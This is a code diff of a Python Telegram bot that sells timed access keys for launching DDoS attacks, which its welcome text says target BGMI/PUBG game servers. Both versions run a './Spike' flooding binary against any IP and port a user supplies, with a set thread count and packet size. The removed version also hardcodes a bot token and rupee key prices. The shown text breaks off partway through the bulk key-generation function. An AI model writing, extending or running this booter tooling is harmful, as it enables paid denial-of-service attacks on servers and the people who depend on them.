@@ -1,1036 +1,403 @@
-import time
-import logging
-import json
-from threading import Thread
-import telebot
-import asyncio
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
+import subprocess
+import threading
 import random
 import string
-from datetime import datetime, timedelta
-from telebot.apihelper import ApiTelegramException
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-from typing import Dict, List, Optional
-import sys
-import os
-
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-
-logger = logging.getLogger(__name__)
+import time
+import asyncio
+from datetime import datetime
+import pytz
 
 # Global variables
-KEY_PRICES = {
-    'hour': 10,  # 10 Rs per hour
-    'day': 80,   # 80 Rs per day
-    'week': 500  # 500 Rs per week
-}
-ADMIN_IDS = [7163028849, 6280440192]
-BOT_TOKEN = "7316548908:AAHPOmOFLoPGSNZWtxd9H6IuXNEphlqUWFE"
-thread_count = 500
-packet_size = 12
-ADMIN_FILE = 'admin_data.json'
-last_attack_times = {}
-COOLDOWN_MINUTES = 3
-attack_in_progress = False  # Track if an attack is running
-ALLOWED_GROUP_ID = -1002400803425  # Replace with your actual group ID
+attack_running = False
+authorized_users = {}  # {user_id: {"expiry_time": expiry_time, "key": key, "redeem_time": redeem_time, "attacks": attack_count}}
+keys = {}  # {key: expiry_time}
+attack_logs = []  # List to store attack logs
+all_users = set()  # Track all users who have interacted with the bot
+# Global variable to store users who tried to start an attack while one was already running
+waiting_users = set()
 
-# Helper function to check if the message is from the allowed group
-def is_allowed_group(chat_id):
-    return chat_id == ALLOWED_GROUP_ID
+# Define admin ID
+ADMIN_ID = 7163028849  # Replace with your admin's Telegram ID
 
-def check_cooldown(user_id: int) -> tuple[bool, int]:
-    """
-    Check if a user is in cooldown period
-    Returns (bool, remaining_seconds)
-    """
-    if user_id not in last_attack_times:
-        return False, 0
-        
-    last_attack = last_attack_times[user_id]
-    current_time = datetime.now()
-    time_diff = current_time - last_attack
-    cooldown_seconds = COOLDOWN_MINUTES * 60
-    
-    if time_diff.total_seconds() < cooldown_seconds:
-        remaining = cooldown_seconds - time_diff.total_seconds()
-        return True, int(remaining)
-    return False, 0
+# Define default values
+DEFAULT_PACKET_SIZE = 12
+DEFAULT_THREADS = 600
+MAX_ATTACK_TIME = 180  # in seconds
 
-def update_last_attack_time(user_id: int):
-    """Update the last attack time for a user"""
-    last_attack_times[user_id] = datetime.now()
+# Kolkata timezone
+KOLKATA_TZ = pytz.timezone('Asia/Kolkata')
 
-def load_admin_data():
-    """Load admin data from file"""
+async def get_user_info(user_id, context):
+    """Fetch user details (Username, First Name, Last Name) given a User ID."""
     try:
-        if os.path.exists(ADMIN_FILE):
-            with open(ADMIN_FILE, 'r') as f:
-                return json.load(f)
-        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
+        user_info = await context.bot.get_chat(user_id)
+        username = f"@{user_info.username}" if user_info.username else "No Username"
+        first_name = user_info.first_name if user_info.first_name else "No First Name"
+        last_name = user_info.last_name if user_info.last_name else "No Last Name"
     except Exception as e:
-        logger.error(f"Error loading admin data: {e}")
-        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
+        print(f"Failed to fetch user info for {user_id}: {e}")
+        username, first_name, last_name = "Unknown", "Unknown", "Unknown"
     
-def update_admin_balance(admin_id: str, amount: float) -> bool:
-    """
-    Update admin's balance after key generation
-    Returns True if successful, False if insufficient balance
-    """
-    try:
-        admin_data = load_admin_data()
-        
-        # Super admins have infinite balance
-        if int(admin_id) in ADMIN_IDS:
-            return True
-            
-        if str(admin_id) not in admin_data['admins']:
-            return False
-            
-        current_balance = admin_data['admins'][str(admin_id)]['balance']
-        
-        if current_balance < amount:
-            return False
-            
-        admin_data['admins'][str(admin_id)]['balance'] -= amount
-        save_admin_data(admin_data)
-        return True
-        
-    except Exception as e:
-        logging.error(f"Error updating admin balance: {e}")
-        return False
-    
-def save_admin_data(data):
-    """Save admin data to file"""
-    try:
-        with open(ADMIN_FILE, 'w') as f:
-            json.dump(data, f, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving admin data: {e}")
-        return False
-    
-def is_super_admin(user_id):
-    """Check if user is a super admin"""
-    return user_id in ADMIN_IDS
+    return f"👤 **User ID:** `{user_id}`\n🔹 **Username:** {username}\n📝 **Name:** {first_name} {last_name}"
 
-def get_admin_balance(user_id):
-    """Get admin's balance"""
-    admin_data = load_admin_data()
-    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)
+# Function to generate random keys
+def generate_key(duration):
+    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+    keys[key] = time.time() + duration
+    return key
 
-def calculate_key_price(amount: int, time_unit: str) -> float:
-    """Calculate the price for a key based on duration"""
-    base_price = KEY_PRICES.get(time_unit.lower().rstrip('s'), 0)
-    return base_price * amount
+# Parse duration strings (e.g., "1hour", "2days")
+def parse_duration(duration_str):
+    if 'hour' in duration_str:
+        return int(duration_str.replace('hour', '')) * 3600
+    elif 'day' in duration_str:
+        return int(duration_str.replace('day', '')) * 86400
+    return None
 
-bot = telebot.TeleBot(BOT_TOKEN)
-
-# Initialize other required variables
-redeemed_keys = set()
-loop = None
-
-# File paths
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
-KEYS_FILE = os.path.join(BASE_DIR, 'key.txt')
-
-keys = {}
-
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_forever()
-
-def ensure_file_exists(filepath):
-    """Ensure the file exists and create if it doesn't"""
-    if not os.path.exists(filepath):
-        with open(filepath, 'w') as f:
-            if filepath.endswith('.txt'):
-                f.write('[]')  # Initialize with empty array for users.txt
-            else:
-                f.write('{}')  # Initialize with empty object for other files
-
-def load_users():
-    """Load users from users.txt with proper error handling"""
-    ensure_file_exists(USERS_FILE)
-    try:
-        with open(USERS_FILE, 'r') as f:
-            content = f.read().strip()
-            if not content:  # If file is empty
-                return []
-            return json.loads(content)
-    except json.JSONDecodeError:
-        # If file is corrupted, backup and create new
-        backup_file = f"{USERS_FILE}.backup"
-        if os.path.exists(USERS_FILE):
-            os.rename(USERS_FILE, backup_file)
-        return []
-    except Exception as e:
-        logging.error(f"Error loading users: {e}")
-        return []
-
-def save_users(users):
-    """Save users to users.txt with proper error handling"""
-    ensure_file_exists(USERS_FILE)
-    try:
-        # Create temporary file
-        temp_file = f"{USERS_FILE}.temp"
-        with open(temp_file, 'w') as f:
-            json.dump(users, f, indent=2)
-        
-        # Rename temp file to actual file
-        os.replace(temp_file, USERS_FILE)
-        return True
-    except Exception as e:
-        logging.error(f"Error saving users: {e}")
-        if os.path.exists(temp_file):
-            os.remove(temp_file)
-        return False
-    
-def get_username_from_id(user_id):
-    users = load_users()
-    for user in users:
-        if user['user_id'] == user_id:
-            return user.get('username', 'N/A')
-    return "N/A"
-
-def is_admin(user_id):
-    """Check if user is either a super admin or regular admin"""
-    admin_data = load_admin_data()
-    return str(user_id) in admin_data['admins'] or user_id in ADMIN_IDS
-
-def load_keys():
-    """Load keys with proper error handling"""
-    ensure_file_exists(KEYS_FILE)
-    keys = {}
-    try:
-        with open(KEYS_FILE, 'r') as f:
-            content = f.read().strip()
-            if not content:  # If file is empty
-                return {}
-                
-            # Parse each line as a separate JSON object
-            for line in content.split('\n'):
-                if line.strip():
-                    key_data = json.loads(line)
-                    # Each line should contain a single key-duration pair
-                    for key, duration_str in key_data.items():
-                        days, seconds = map(float, duration_str.split(','))
-                        keys[key] = timedelta(days=days, seconds=seconds)
-            return keys
-                    
-    except Exception as e:
-        logging.error(f"Error loading keys: {e}")
-        return {}
-
-def save_keys(keys: Dict[str, timedelta]):
-    """Save keys with proper error handling"""
-    ensure_file_exists(KEYS_FILE)
-    try:
-        temp_file = f"{KEYS_FILE}.temp"
-        with open(temp_file, 'w') as f:
-            # Write each key-duration pair as a separate JSON object on a new line
-            for key, duration in keys.items():
-                duration_str = f"{duration.days},{duration.seconds}"
-                json_line = json.dumps({key: duration_str})
-                f.write(f"{json_line}\n")
-        
-        # Rename temp file to actual file
-        os.replace(temp_file, KEYS_FILE)
-        return True
-        
-    except Exception as e:
-        logging.error(f"Error saving keys: {e}")
-        if os.path.exists(temp_file):
-            os.remove(temp_file)
-        return False
-    
-def check_user_expiry():
-    """Periodically check and remove expired users"""
-    while True:
-        try:
-            users = load_users()
-            current_time = datetime.now()
-            
-            # Filter out expired users
-            active_users = [
-                user for user in users 
-                if datetime.fromisoformat(user['valid_until']) > current_time
-            ]
-            
-            # Only save if there are changes
-            if len(active_users) != len(users):
-                save_users(active_users)
-                
-        except Exception as e:
-            logging.error(f"Error in check_user_expiry: {e}")
-        
-        time.sleep(300)  # Check every 5 minutes
-
-def generate_key(length=10):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-
-@bot.message_handler(commands=['thread'])
-def set_thread_count(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-
-    # Only super admins can change thread settings
-    if not is_super_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to change thread settings.*", parse_mode='Markdown')
-        return
-
-    bot.send_message(chat_id, "*Please specify the thread count.*", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_thread_command)
-
-@bot.message_handler(commands=['packet'])
-def set_packet_size(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-
-    # Only super admins can change packet size settings
-    if not is_super_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to change packet size settings.*", parse_mode='Markdown')
-        return
-
-    bot.send_message(chat_id, "*Please specify the packet size.*", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_packet_command)
-
-def process_packet_command(message):
-    global packet_size
-    chat_id = message.chat.id
+# Function to run the attack
+def attack(ip, port, context, chat_id, user_id):
+    global attack_running
 
     try:
-        new_packet_size = int(message.text)
-        
-        if new_packet_size <= 0:
-            bot.send_message(chat_id, "*Packet size must be a positive number.*", parse_mode='Markdown')
-            return
+        # Run the attack command in a non-blocking way
+        subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
 
-        packet_size = new_packet_size
-        bot.send_message(chat_id, f"*Packet size set to {packet_size} for dark.*", parse_mode='Markdown')
+        # Log the attack in Kolkata timezone
+        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
+        attack_logs.append({
+            "user_id": user_id,
+            "ip": ip,
+            "port": port,
+            "time": attack_time
+        })
 
-    except ValueError:
-        bot.send_message(chat_id, "*Invalid packet size. Please enter a valid number.*", parse_mode='Markdown')
+        # Increment attack count for the user
+        if user_id in authorized_users:
+            authorized_users[user_id]["attacks"] += 1
 
-def process_thread_command(message):
-    global thread_count
-    chat_id = message.chat.id
-
-    try:
-        new_thread_count = int(message.text)
-        
-        if new_thread_count <= 0:
-            bot.send_message(chat_id, "*Thread count must be a positive number.*", parse_mode='Markdown')
-            return
-
-        thread_count = new_thread_count
-        bot.send_message(chat_id, f"*Thread count set to {thread_count} for dark.*", parse_mode='Markdown')
-
-    except ValueError:
-        bot.send_message(chat_id, "*Invalid thread count. Please enter a valid number.*", parse_mode='Markdown')
-
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-
-async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
-    global attack_in_progress
-    
-    try:
-        # Check if an attack is already in progress
-        if attack_in_progress:
-            bot.send_message(chat_id, "🚨 An attack is already in progress. Please wait for it to finish.")
-            return
-
-        # Set attack_in_progress to True
-        attack_in_progress = True
-
-        # Update last attack time before starting the attack
-        update_last_attack_time(user_id)
-
-        # Construct command for dark binary with thread count and packet size
-        command = f"./Spike {target_ip} {target_port} {duration} {packet_size} {thread_count}"
-
-        # Send initial attack message
-        bot.send_message(chat_id, 
-            f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
-            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
-            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
-            f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
-            f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
-            f"᚛ ᚛ @TITANOP24 ᚜ ᚜")
-
-        # Create and run process without output
-        process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.DEVNULL,
-            stderr=asyncio.subprocess.DEVNULL
-        )
-        
-        # Wait for process to complete
-        await process.wait()
-
-        # Send completion message
-        bot.send_message(chat_id, 
-            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
-
-    except Exception as e:
-        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")
     finally:
-        # Set attack_in_progress to False when the attack finishes
-        attack_in_progress = False
+        # Ensure the attack_running flag is reset even if an error occurs
+        attack_running = False
 
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
+# Command: Start the bot
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    all_users.add(user_id)  # Add user to the all_users set
+
+    start_message = (
+        "🚀 *Welcome to BGMI Attack Bot* 🚀\n\n"
+        "⚡️ _A powerful tool to manage DDoS attacks for BGMI/PUBG servers_ ⚡️\n\n"
+        "✨ **Key Features:**\n"
+        "   • Start attacks with `/bgmi` command\n"
+        "   • Key-based authorization system\n"
+        "   • Admin controls for key generation\n"
+        "   • Real-time attack monitoring\n\n"
+        "🔧 **Commands:**\n"
+        "   /help - Show all commands\n"
+        "   /bgmi - Start attack\n"
+        "   /redeem - Activate your key\n\n"
+        "👑 **Bot Owner:** [TITAN OP](https://t.me/TITANOP24)\n"
+        "⚙️ _Use this bot responsibly!_"
+    )
+    await update.message.reply_text(start_message, parse_mode="Markdown")
+
+# Command: Show help
+async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    help_message = (
+        "🛠️ *Available Commands* 🛠️\n\n"
+        "🎮 *Attack Commands:*\n"
+        "`/bgmi <ip> <port>` - Start a new attack\n"
+        "`/redeem <key>` - Redeem your access key\n\n"
+        "🔑 *Admin Commands:*\n"
+        "`/genkey <duration>` - Generate single key\n"
+        "`/mgenkey <duration> <amount>` - Bulk generate keys\n"
+        "`/users` - List authorized users\n"
+        "`/logs` - Show attack logs\n"
+        "`/broadcast <message>` - Broadcast message to all users\n\n"
+        "ℹ️ *Info Commands:*\n"
+        "`/start` - Show bot introduction\n"
+        "`/help` - Display this message\n\n"
+        "👨💻 *Developer:* [@TITANOP24](https://t.me/TITANOP24)\n"
+        "🔒 _All attacks are logged and monitored_"
+    )
+    await update.message.reply_text(help_message, parse_mode="Markdown")
+
+async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handles the /bgmi command while ensuring only one attack runs at a time."""
+    global attack_running
+    user_id = update.message.from_user.id
+
+    # If an attack is already running, notify the user and add them to the waiting list
+    if attack_running:
+        waiting_users.add(user_id)
+        await update.message.reply_text('⏳ Another attack is running. Please wait for it to finish.')
         return
 
-    user_id = message.from_user.id
-
-    # Check if an attack is already in progress
-    if attack_in_progress:
-        bot.send_message(chat_id, "🚨 An attack is already in progress. Please wait for it to finish.")
+    # Check if user is authorized
+    if user_id not in authorized_users or time.time() > authorized_users[user_id]["expiry_time"]:
+        await update.message.reply_text('❌ You are not authorized. Redeem a key first.')
         return
 
-    # Check cooldown first, regardless of admin status
-    in_cooldown, remaining = check_cooldown(user_id)
-    if in_cooldown:
-        minutes = remaining // 60
-        seconds = remaining % 60
-        bot.send_message(
-            chat_id,
-            f"*⏰ Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
-            parse_mode='Markdown'
+    # Validate command arguments
+    if len(context.args) < 2:
+        await update.message.reply_text('Usage: /bgmi <ip> <port>')
+        return
+
+    ip, port = context.args[0], context.args[1]
+
+    # Start the attack
+    attack_running = True
+    attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
+
+    # Notify about attack start
+    attack_details = (
+        f"🚀 Attack started!\n\n"
+        f"🎯 Target IP: `{ip}`\n"
+        f"🚪 Port: `{port}`\n"
+        f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
+        f"📅 Time: `{attack_time}`"
+    )
+    await update.message.reply_text(attack_details, parse_mode="Markdown")
+
+    # Run attack asynchronously and pass context
+    asyncio.create_task(run_attack(ip, port, user_id, context))
+
+async def run_attack(ip, port, user_id, context):
+    """Runs attack asynchronously and notifies waiting users when finished."""
+    global attack_running, waiting_users
+
+    try:
+        # Start attack process
+        subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
+
+        # Log attack
+        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
+        attack_logs.append({
+            "user_id": user_id,
+            "ip": ip,
+            "port": port,
+            "time": attack_time
+        })
+
+        # Increment user's attack count
+        if user_id in authorized_users:
+            authorized_users[user_id]["attacks"] += 1
+
+        # Wait asynchronously
+        await asyncio.sleep(MAX_ATTACK_TIME)
+
+    finally:
+        # Reset attack flag
+        attack_running = False
+
+        # Notify the original user
+        attack_finished_message = (
+            f"✅ Attack finished!\n\n"
+            f"🎯 Target IP: `{ip}`\n"
+            f"🚪 Port: `{port}`\n"
+            f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
+            f"📅 Time: `{datetime.now(KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')}`"
         )
-        return
+        await context.bot.send_message(chat_id=user_id, text=attack_finished_message, parse_mode="Markdown")
 
-    # If user is admin, allow attack
-    if is_admin(user_id):
-        try:
-            bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
-            bot.register_next_step_handler(message, process_attack_command, chat_id)
-            return
-        except Exception as e:
-            logging.error(f"Error in attack command: {e}")
-            return
-
-    # For regular users, check if they have a valid key
-    users = load_users()
-    found_user = next((user for user in users if user['user_id'] == user_id), None)
-
-    if not found_user:
-        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- ᚛ @TITANOP24 ᚜*", parse_mode='Markdown')
-        return
-
-    try:
-        bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
-        bot.register_next_step_handler(message, process_attack_command, chat_id)
-    except Exception as e:
-        logging.error(f"Error in attack command: {e}")
-
-def process_attack_command(message, chat_id):
-    try:
-        user_id = message.from_user.id
-        
-        # Double-check cooldown when processing the attack
-        in_cooldown, remaining = check_cooldown(user_id)
-        if in_cooldown:
-            minutes = remaining // 60
-            seconds = remaining % 60
-            bot.send_message(
-                chat_id,
-                f"*⏰ Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
-                parse_mode='Markdown'
-            )
-            return
-            
-        args = message.text.split()
-        
-        if len(args) != 3:
-            bot.send_message(chat_id, "*गलत हुआ है। ट्राई अगेन 😼*", parse_mode='Markdown')
-            return
-        
-        target_ip = args[0]
-        
-        try:
-            target_port = int(args[1])
-        except ValueError:
-            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
-            return
-        
-        try:
-            duration = int(args[2])
-        except ValueError:
-            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
-            return
-
-        if target_port in blocked_ports:
-            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
-            return
-
-        # Create a new event loop for this thread if necessary
-        try:
-            loop = asyncio.get_event_loop()
-        except RuntimeError:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-
-        # Run the attack command with user_id
-        loop.run_until_complete(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id))
-        
-    except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
-        bot.send_message(chat_id, "*An error occurred while processing your command.*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['owner'])
-def send_owner_info(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    owner_message = "This Bot Has Been Developed By ᚛ @TITANOP24 ᚜"  
-    bot.send_message(message.chat.id, owner_message)
-
-@bot.message_handler(commands=['addadmin'])
-def add_admin_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-    
-    # Only super admins can add new admins
-    if not is_super_admin(user_id):
-        bot.reply_to(message, "*You are not authorized to add admins.*", parse_mode='Markdown')
-        return
-
-    try:
-        # Parse command arguments
-        args = message.text.split()
-        if len(args) != 3:
-            bot.reply_to(message, "*Usage: /addadmin <user_id> <balance>*", parse_mode='Markdown')
-            return
-
-        new_admin_id = args[1]
-        try:
-            balance = float(args[2])
-            if balance < 0:
-                bot.reply_to(message, "*Balance must be a positive number.*", parse_mode='Markdown')
-                return
-        except ValueError:
-            bot.reply_to(message, "*Balance must be a valid number.*", parse_mode='Markdown')
-            return
-
-        # Load current admin data
-        admin_data = load_admin_data()
-
-        # Add new admin with balance
-        admin_data['admins'][new_admin_id] = {
-            'balance': balance,
-            'added_by': user_id,
-            'added_date': datetime.now().isoformat()
-        }
-
-        # Save updated admin data
-        if save_admin_data(admin_data):
-            bot.reply_to(message, f"*Successfully added admin:*\nID: `{new_admin_id}`\nBalance: `{balance}`", parse_mode='Markdown')
-            
-            # Try to notify the new admin
-            try:
-                bot.send_message(
-                    int(new_admin_id),
-                    "*🎉 Congratulations! You have been promoted to admin!*\n"
-                    f"Your starting balance is: `{balance}`\n\n"
-                    "You now have access to admin commands:\n"
-                    "/genkey - Generate new key\n"
-                    "/remove - Remove user\n"
-                    "/balance - Check your balance",
-                    parse_mode='Markdown'
-                )
-            except:
-                logger.warning(f"Could not send notification to new admin {new_admin_id}")
-        else:
-            bot.reply_to(message, "*Failed to add admin. Please try again.*", parse_mode='Markdown')
-
-    except Exception as e:
-        logger.error(f"Error in add_admin_command: {e}")
-        bot.reply_to(message, "*An error occurred while adding admin.*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['balance'])
-def check_balance(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-
-    if not is_admin(user_id):
-        bot.reply_to(message, "*This command is only available for admins.*", parse_mode='Markdown')
-        return
-
-    balance = get_admin_balance(user_id)
-    if is_super_admin(user_id):
-        bot.reply_to(message, "*You are a super admin with unlimited balance.*", parse_mode='Markdown')
-    else:
-        bot.reply_to(message, f"*Your current balance: {balance}*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['removeadmin'])
-def remove_admin_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-
-    if not is_super_admin(user_id):
-        bot.reply_to(message, "*You are not authorized to remove admins.*", parse_mode='Markdown')
-        return
-
-    try:
-        args = message.text.split()
-        if len(args) != 2:
-            bot.reply_to(message, "*Usage: /removeadmin <user_id>*", parse_mode='Markdown')
-            return
-
-        admin_to_remove = args[1]
-        admin_data = load_admin_data()
-
-        if admin_to_remove in admin_data['admins']:
-            del admin_data['admins'][admin_to_remove]
-            if save_admin_data(admin_data):
-                bot.reply_to(message, f"*Successfully removed admin {admin_to_remove}*", parse_mode='Markdown')
-                
-                # Try to notify the removed admin
+        # Notify users who were waiting
+        if waiting_users:
+            for user in waiting_users:
                 try:
-                    bot.send_message(
-                        int(admin_to_remove),
-                        "*Your admin privileges have been revoked.*",
-                        parse_mode='Markdown'
-                    )
-                except:
-                    pass
-            else:
-                bot.reply_to(message, "*Failed to remove admin. Please try again.*", parse_mode='Markdown')
-        else:
-            bot.reply_to(message, "*This user is not an admin.*", parse_mode='Markdown')
+                    await context.bot.send_message(chat_id=user, text="🔔 The previous attack has finished. You can now start your attack!")
+                except Exception as e:
+                    print(f"Failed to notify user {user}: {e}")
 
-    except Exception as e:
-        logger.error(f"Error in remove_admin_command: {e}")
-        bot.reply_to(message, "*An error occurred while removing admin.*", parse_mode='Markdown')
+            # Clear waiting list
+            waiting_users.clear()
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
+
+# Command: Generate a key (Admin only)
+async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != ADMIN_ID:
+        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
         return
 
-    user_id = message.from_user.id
-    username = message.from_user.username or "N/A"
+    if len(context.args) < 1:
+        await update.message.reply_text('Usage: /genkey <duration>')
+        return
 
-    # Create keyboard markup
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    my_account_button = KeyboardButton("𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
-    attack_button = KeyboardButton("🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
-    markup.add(my_account_button, attack_button)
+    duration = parse_duration(context.args[0])
+    if not duration:
+        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
+        return
 
-    if is_super_admin(user_id):
-        welcome_message = (
-            f"Welcome, Super Admin! Developed By ᚛ @TITANOP24 ᚜\n\n"
-            f"Admin Commands:\n"
-            f"/addadmin - Add new admin\n"
-            f"/removeadmin - Remove admin\n"
-            f"/genkey - Generate new key\n"
-            f"/remove - Remove user\n"
-            f"/users - List all users\n"
-            f"/thread - Set thread count\n"
-            f"/packet - Set packet size\n"
-        )
-    elif is_admin(user_id):
-        balance = get_admin_balance(user_id)
-        welcome_message = (
-            f"Welcome, Admin! Developed By ᚛ @TITANOP24 ᚜\n\n"
-            f"Your Balance: {balance}\n\n"
-            f"Admin Commands:\n"
-            f"/genkey - Generate new key\n"
-            f"/remove - Remove user\n"
-            f"/balance - Check your balance"
+    key = generate_key(duration)
+    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺:\n\n`{key}`', parse_mode="Markdown")
+
+# Command: Generate multiple keys (Admin only)
+async def mgenkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != ADMIN_ID:
+        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
+        return
+
+    if len(context.args) < 2:
+        await update.message.reply_text('Usage: /mgenkey <duration> <number>')
+        return
+
+    duration = parse_duration(context.args[0])
+    if not duration:
+        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
+        return
+
+    number = int(context.args[1])
+    keys_list = [generate_key(duration) for _ in range(number)]
